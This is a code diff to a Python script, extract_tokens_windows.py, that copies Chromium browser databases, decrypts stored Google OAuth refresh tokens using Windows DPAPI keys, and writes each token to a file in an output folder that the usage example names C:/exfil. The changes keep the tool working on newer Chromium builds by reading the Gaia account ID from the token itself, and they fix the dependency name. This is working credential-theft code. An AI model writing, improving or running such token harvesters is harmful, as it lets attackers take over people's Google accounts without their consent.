@@ -11,8 +11,10 @@ Usage:
     python extract_tokens_windows.py --output C:/exfil   # Custom output dir
     python extract_tokens_windows.py --browser chrome    # Single browser
 
-Dependencies:
-    pip install pycryptodome pypiwin32
+Dependencies (Windows only):
+    pip install -r requirements.txt
+    # or explicitly:
+    pip install pycryptodome pywin32
 """
 
 import os
@@ -29,7 +31,11 @@ from datetime import datetime
 try:
     import win32crypt
 except ImportError:
-    print("ERROR: pypiwin32 not installed. Run: pip install pypiwin32")
+    # NOTE: the package is 'pywin32'. 'pypiwin32' is an abandoned
+    # alias that does not ship wheels for modern Python versions.
+    print("ERROR: pywin32 not installed. Run: pip install pywin32")
+    print("       (or: pip install -r requirements.txt)")
+    print("       Note: pywin32 is Windows-only; it provides win32crypt/DPAPI.")
     sys.exit(1)
 
 try:
@@ -111,6 +117,29 @@ def decrypt_token(ciphertext, master_key):
 def get_profile_name(profile_path):
     """Extract human-readable profile name from path."""
     return os.path.basename(profile_path)
+
+
+def extract_gaia_id(token):
+    """
+    Derive the Gaia ID embedded in a Chromium OAuth token.
+
+    Token format is 1//[opaque payload]:[GaiaID]. Modern Chromium builds
+    removed the account_id column from token_service, so the Gaia ID has
+    to be read off the token string itself. Returns "unknown" when the
+    suffix is missing or not numeric.
+    """
+    tail = token.rpartition(":")[2].strip()
+    return tail if tail.isdigit() else "unknown"
+
+
+def safe_filename_part(value):
+    """Make a value safe to embed in a Windows filename."""
+    cleaned = "".join(
+        ch if (ch.isalnum() or ch in "._-") else "_" for ch in str(value)
+    )
+    return cleaned or "unknown"
+
+
 # --- Main Extraction ---
 
 def extract_browser(browser_key, output_dir):
@@ -151,8 +180,23 @@ def extract_browser(browser_key, output_dir):
             shutil.copy2(str(web_data_path), tmp_path)
 
             conn = sqlite3.connect(tmp_path)
+            columns = [r[1] for r in conn.execute("PRAGMA table_info(token_service)")]
+            if not columns:
+                conn.close()
+                print("no token_service table")
+                continue
+
+            # Modern Chromium dropped the account_id column from
+            # token_service; older builds still have it. Use it when it is
+            # present, otherwise derive the Gaia ID from the token itself
+            # (format: 1//[payload]:[GaiaID]).
+            has_account_id = "account_id" in columns
+            selected = (
+                "encrypted_token, account_id" if has_account_id
+                else "encrypted_token"
+            )
             cursor = conn.execute(
-                "SELECT encrypted_token, account_id FROM token_service "
+                f"SELECT {selected} FROM token_service "
                 "WHERE service LIKE '%google%'"
             )
             rows = cursor.fetchall()
@@ -163,13 +207,20 @@ def extract_browser(browser_key, output_dir):
                 continue
 
             print(f"{len(rows)} row(s)")
-            for encrypted_blob, gaia_id in rows:
+            for row in rows:
+                encrypted_blob = row[0]
+                gaia_id = row[1] if has_account_id else "?"
                 try:
                     token = decrypt_token(bytes(encrypted_blob), master_key)
                     if token.startswith("1//"):
+                        if not gaia_id or not str(gaia_id).isdigit():
+                            gaia_id = extract_gaia_id(token)
                         extracted.append((gaia_id, token, profile, browser_key))
-                        safe_id = gaia_id.replace(":", "_").replace("/", "_")
-                        tok_file = output_dir / f"token_{browser_key}_{profile}_{safe_id}.txt"
+                        tok_file = (
+                            output_dir
+                            / f"token_{browser_key}_{profile}_"
+                              f"{safe_filename_part(gaia_id)}.txt"
+                        )
                         tok_file.write_text(token + "\n")
                         print(f"      [+] Gaia {gaia_id}: OK ({token[:30]}...)")
                     else:
